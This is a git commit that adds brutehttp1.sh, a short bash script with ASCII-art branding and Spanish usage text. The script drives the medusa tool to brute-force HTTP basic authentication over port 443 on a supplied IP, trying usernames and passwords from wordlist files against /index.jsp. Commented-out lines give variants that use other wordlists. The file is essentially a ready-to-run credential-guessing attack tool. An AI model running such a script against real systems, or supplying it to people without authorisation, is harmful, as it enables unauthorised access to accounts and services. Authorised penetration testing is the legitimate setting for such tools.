3c29cf1156254b0e6112095635ad612301efae14
hackingyseguridad <antonio_taboada@hotmail.es>
2026-01-29 15:54:55 +0100

    Create brutehttp1.sh

---
+++ brutehttp1.sh
@@ -0,0 +1,53 @@
+#!/bin/bash
+cat << "INFO"
+
+                                                          ..
+                               ,,,                         MM .M
+                           ,!MMMMMMM!,                     MM MM  ,.
+   ., .M                .MMMMMMMMMMMMMMMM.,          'MM.  MM MM .M'
+ . M: M;  M          .MMMMMMMMMMMMMMMMMMMMMM,          'MM,:M M'!M'
+;M MM M: .M        .MMMMMMMMMMMMMMMMMMMMMMMMMM,         'MM'...'M
+ M;MM;M :MM      .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.       .MMMMMMMM
+ 'M;M'M MM      MMMMMM  MMMMMMMMMMMMMMMMM  MMMMMM.    ,,M.M.'MMM'
+  MM'MMMM      MMMMMM @@ MMMMMMMMMMMMMMM @@ MMMMMMM.'M''MMMM;MM'
+ MM., ,MM     MMMMMMMM  MMMMMMMMMMMMMMMMM  MMMMMMMMM      '.MMM
+ 'MM;MMMMMMMM.MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMM
+  ''.'MMM'  .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM       MMMM
+   MMC      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMMM
+  .MM      :MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM''MMM       MMMMM
+  MMM      :M  'MMMMMMMMM brute http MMMMMMM'.MM  MM:M.    'MMMMM
+ .MMM   ...:M: :M.'MMMMMMMMMMMMMMMMMMMMMMMMM'.M''   MM:MMMMMMMMMMMM'
+AMMM..MMMMM:M.    :M.'hackingyseguridad.com'.MM'     MM''''''''''''
+MMMMMMMMMMM:MM     'M'.M'MMMMMMMMMMMMMM'.MC'M'     .MM
+ '''''''''':MM.       'MM!M.'M-M-M-M'M.'MM'        MMM
+            MMM.            'MMMM!MMMM'            .MM
+             MMM.             '''   ''            .MM'
+              MMM.                               MMM'
+               MMMM            ,.J.JJJJ.       .MMM'
+                MMMM.       'JJJJJJJ'JJJM   CMMMMM
+                  MMMMM.    'JJJJJJJJ'JJJ .MMMMM'
+                    MMMMMMMM.'  'JJJJJ'JJMMMMM'
+                      'MMMMMMMMM'JJJJJ JJJJJ'
+                         ''MMMMMMJJJJJJJJJJ'
+                                 'JJJJJJJJ'
+
+INFO
+if [ -z "$1" ]; then
+        echo
+        echo "Fuerza bruta con diccionarios a HTTP auth basic autenticacion basica por puerto 443/TCP."
+        echo "Requiere medusa"
+        echo "Especificar ruta / de la carpeta "
+        echo "Uso.: sh brutehttp.sh <ip>"
+        echo
+        exit 0
+fi
+echo
+echo
+medusa -h $1 -U usuarios0.txt -P claves0.txt -M http -m  /index.jsp -m METHOD:GET -m SSL -m PORT:443 -f
+# medusa -h $1 -U usuarios.txt -P claves0.txt 
+# medusa -h $1 -U usuarios.txt -P claves.txt 
+# medusa -h $1S -U usuarios0.txt -P claves.txt 
+# medusa -h $1 -U usuarios.txt -P claves.txt 
+# medusa -h $1 -U usuarios.txt -P claves2.txt 
+# medusa -h $1 -U usuarios0.txt -P claves2.txt 
+echo
